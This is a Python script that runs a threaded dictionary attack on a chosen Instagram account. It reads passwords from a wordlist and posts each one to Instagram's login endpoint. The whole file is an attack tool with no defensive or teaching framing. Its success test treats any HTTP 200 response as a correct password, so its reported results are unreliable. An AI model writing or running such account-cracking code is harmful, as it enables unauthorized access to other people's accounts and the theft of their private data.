import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.exceptions import RequestException

# Function to read passwords from a file
def read_wordlist(file_path):
    try:
        with open(file_path, 'r') as file:
            passwords = file.read().splitlines()  # Read all lines and split into a list
        return passwords
    except FileNotFoundError:
        print(f"Error: The file at {file_path} was not found.")
        return []

# Function to handle login attempts
def login_attempt(username, password, login_url):
    try:
        # Set up the login data
        login_data = {
            'username': username,
            'password': password
        }

        # Send a POST request to the login URL with the login data
        response = requests.post(login_url, data=login_data)

        # Check if the login was successful
        if response.status_code == 200:
            print(f'Login successful for username: {username}')
            print(f'Password: {password}')
            return True
    except RequestException as e:
        print(f'Error: {e}')
    return False

# Main function to execute the script
def main():
    # Ask user for the Instagram username
    username = input("Enter the Instagram username: ")

    # Ask user for the location of the wordlist file
    wordlist_path = input("Enter the location of the wordlist file: ")

    # Read the wordlist from the file
    passwords = read_wordlist(wordlist_path)

    if not passwords:
        print("No passwords found. Exiting.")
        return

    # Set up the Instagram login page URL
    login_url = 'https://www.instagram.com/accounts/login/ajax/'

    # Set up the number of threads to use for parallel requests
    num_threads = 5

    # Set up the ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        # Submit login attempts for each password in the wordlist
        futures = [executor.submit(login_attempt, username, password, login_url) for password in passwords]

        # Process results as they are completed
        for future in as_completed(futures):
            result = future.result()
            if result:
                print('Login attempt completed successfully.')
                break
            else:
                print('Login attempt failed.')

# Run the script
if __name__ == "__main__":
    main()

